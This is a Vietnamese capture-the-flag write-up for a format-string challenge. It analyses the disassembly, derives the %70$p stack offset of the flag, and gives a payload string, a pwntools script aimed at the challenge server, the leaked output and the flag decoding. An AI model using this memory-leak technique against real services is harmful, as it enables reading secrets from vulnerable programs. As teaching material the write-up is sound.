# Leaky Logger — Writeup

> **Category:** Pwn
> **Points:** 10
> **Difficulty:** f8al
> **Service:** `nc 18.215.143.250 9002`
> **Provided:** `logger` (x86-64 ELF, not stripped)

## Mô tả

> The RST Hydro event logger reads the flag into memory at startup, then offers to record one log line for you. It echoes that line back a little too literally.

Chương trình đọc flag từ `flag.txt` vào bộ nhớ lúc khởi động, sau đó nhận **một dòng log** từ người dùng và... in lại. "In lại hơi sát nghĩa quá" — gợi ý ngay tới format string.

## Phân tích binary

```
$ file logger
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

Binary không strip nên nhìn symbol ngay được hàm `main` (tại `0x401236`, nguồn `vuln.c`). Disassemble bằng capstone:

```asm
; --- đọc flag vào stack ---
401295:  call  fopen            ; fopen("flag.txt", "r")
4012cf:  call  memset           ; memset(buf, 0, 0x50)
4012e4:  call  fgets            ; fgets(buf, 0x50, fp)   ; buf = rbp-0x60
40130e:  call  fclose

; --- đọc input người dùng ---
401362:  call  fgets            ; fgets(input, 0x200, stdin) ; input = rbp-0x260

; --- echo lại ---
40139e:  call  puts             ; "logged: "
4013b2:  call  printf           ; printf(input)  <-- BUG!
```

Hai điểm mấu chốt:

1. **Format string bug:** tại `0x4013b2`, input của người dùng được đưa thẳng vào `rdi` làm format string của `printf` — không có đối số nào khác, không hề có `%s`. Ta có thể dùng `%n$p` để đọc tuỳ ý các giá trị trên stack.
2. **Vị trí flag trên stack:** flag nằm trong buffer `rbp-0x60`, còn input nằm ở `rbp-0x260`. Vì `main` làm `sub rsp, 0x260`, tại thời điểm gọi `printf` thì `rsp == rbp - 0x260`, tức **buffer input nằm ngay tại `rsp`**.

### Tính offset của flag

`printf` lấy biến động từ `rsi, rdx, rcx, r8, r9` (`%1$p`–`%5$p`), sau đó lấy tiếp từ stack bắt đầu tại `rsp` (`%6$p` = qword đầu tiên của buffer input).

Flag buffer cách `rsp` một khoảng:

```
0x260 - 0x60 = 0x200 byte  =>  0x200 / 8 = 64 qword
```

Vậy qword đầu tiên của flag là `%6$p` + 64 = **`%70$p`**. Flag buffer dài `0x50` byte = 10 qword, nên leak từ `%70$p` tới `%79$p`.

## Khai thác

Gửi một dòng duy nhất:

```
%70$p.%71$p.%72$p.%73$p.%74$p.%75$p.%76$p.%77$p.%78$p.%79$p
```

Script pwntools:

```python
from pwn import *
context.log_level = 'info'

fmt = '.'.join('%%%d$p' % i for i in range(70, 80))
io = remote('18.215.143.250', 9002)
io.recvuntil(b'recorded:')
io.sendline(fmt.encode())
print(io.recvall(timeout=5).decode())
```

Kết quả trả về:

```
logged: 0x667b6e6f63747372.0x74735f74616d7230.0x336c5f73676e3172.
        0x735f6568745f6b61.0x7d6b636174.(nil).(nil).(nil).(nil).(nil)
```

5 qword đầu là flag (các slot sau toàn số 0 vì buffer đã được `memset`). Mỗi qword decode ngược theo little-endian:

```python
vals = ['0x667b6e6f63747372', '0x74735f74616d7230', '0x336c5f73676e3172',
        '0x735f6568745f6b61', '0x7d6b636174']
b = b''.join(int(v, 16).to_bytes(8, 'little') for v in vals)
print(b.decode())
```

## Flag

```
rstcon{f0rmat_str1ngs_l3ak_the_stack}
```

## Tóm tắt

- **Bug:** `printf(input)` với input do người dùng kiểm soát hoàn toàn (format string, đọc bộ nhớ).
- **Lợi dụng:** flag được nạp sẵn vào stack buffer; tính offset bằng layout stack của `main` (`sub rsp, 0x260`, buffer input tại `rsp`, flag tại `rbp-0x60`) → flag ở slot `%70$p`.
- **Bài học:** không bao giờ truyền chuỗi người dùng trực tiếp làm format string — luôn dùng `printf("%s", input)`.
